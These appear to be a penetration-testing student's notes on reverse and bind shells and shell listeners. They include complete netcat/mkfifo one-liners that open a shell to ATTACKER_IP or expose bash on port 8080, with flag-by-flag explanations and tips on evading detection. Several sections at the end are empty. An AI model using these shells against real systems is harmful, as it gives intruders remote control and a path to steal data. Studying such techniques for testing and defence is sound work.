### Table of contents
- [[#Intro]]
- [[#Reverse Shell]]
- [[#Bind Shell]]
- 

___
### Intro
[[#Table of contents|Back to the top]]

*Software used to interact with OS*

- **Remote System Control**: execute commands or software remotely in target system
- **Privilege Escalation**
- **Data Exfiltration**: explore system to read and copy sensitive data from it
- **Persistence and Maintenance Access**: create access through users and credentials or copy backdoor software to maintain access to target system for later usage
- **Post-Exploitation Activities**: deploying malware, creating hidden accounts, deleting information, ...
- **Access Other Systems on the Network**: hop through network to different target (aka pivoting)

___
### Reverse Shell
[[#Table of contents|Back to the top]]

*Aka Connect Back Shell, connections initiate from target system to attacker's machine (--> avoid detection)*

1. **Set up Netcat (`nc`) Listener**
**`nc -lvnp 443`**
- `-l`: listen
- `-v`: verbose
- `-n`: prevent connection from using DNS for lookup, it won't resolve hostname
- `-p`: specify port to listen on (443 here)
  Use known ports used by other applications to blend in (53, 80, 8080, 443, 139, 445)

2. **Gain Reverse Shell Access**
Execute reverse shell **[payload](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)**

Example of reverse shell payload
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
- `rm -f /tmp/f`: removes any existing named pipe file located at `/tmp/f/`, ensures that script can create new named pipe without conflicts
- `mkfifo /tmp/f`: creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`, allow for two-way communication between processes, acts as conduit for input/output
- `cat /tmp/f`: reads data from named pipe, waits for input that can be sent through the pipe
- `| bash -i 2>&1`: output of `cat` is piped to shell instance (`bash -i`) --> attacker can execute commands interactively. `2>&1` redirects standard error to standard output --> error messages are sent back to attacker
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: pipes shell's output through `nc` to attacker's IP on specified listening port
- `>/tmp/f`: sends output of commands back into named pipe --> bi-directional communication

3. **Receive Shell**

___
### Bind Shell
[[#Table of contents|Back to the top]]

*Bind a port on compromised system, listen for connection. Connection --> attacker gains access to shell session*

Used when target doesn't allow outgoing connections but requires to remain active --> detection

1. **Set up Bind Shell on Target**
**`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`**
- `rm -f /tmp/f`: removes any existing named pipe file located at `/tmp/f/`, ensures that script can create new named pipe without conflicts
- `mkfifo /tmp/f`: creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`, allow for two-way communication between processes, acts as conduit for input/output
- `cat /tmp/f`: reads data from named pipe, waits for input that can be sent through the pipe
- `| bash -i 2>&1`: output of `cat` is piped to shell instance (`bash -i`) --> attacker can execute commands interactively. `2>&1` redirects standard error to standard output --> error messages are sent back to attacker
- `| nc -l 0.0.0.0 8080`: starts Netcat in listen mode (`-l`) on all interfaces (`0.0.0.0`) and port `8080`. The shell will be exposed to the attacker once they connect to this port.
- `>/tmp/f`: sends output of commands back into named pipe --> bi-directional communication

2. **Attacker connect to Bind Shell**
**`nc -nv TARGET_IP 8080`**
- `nc`: start Netcat, establish connection to target
- `-n`: disable DNS resolution
- `-v`: verbose

Listening below port **1024** requires root access / privilege

___
### Shell Listeners
[[#Table of contents|Back to the top]]

*Similar to Netcat*

**Rlwrap**: uses GNU readline library to provide editing keyboard and history
`rlwrap nc -lvnp 443`: wrap netcat in order to able to use arrow keys and history for better interaction

**Ncat**: improved version of Netcat
`ncat -lvnp 4444` (listening to reverse shell)
`ncat --ssl -lvnp 4444` (listening to reverse shell with SSL)

**Socat**: create socket connection between 2 data sources (2 different hosts)
`socat -d -d TCP-LISTEN:443 STDOUT`
- `-d -d`: extra verbose
- `TCP-LISTEN:443`: create TCP listener on port 443, establish server socket for incoming connections
- `STDOUT`: direct incoming data to terminal

___
### Shell Payloads
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
### 
[[#Table of contents|Back to the top]]



___
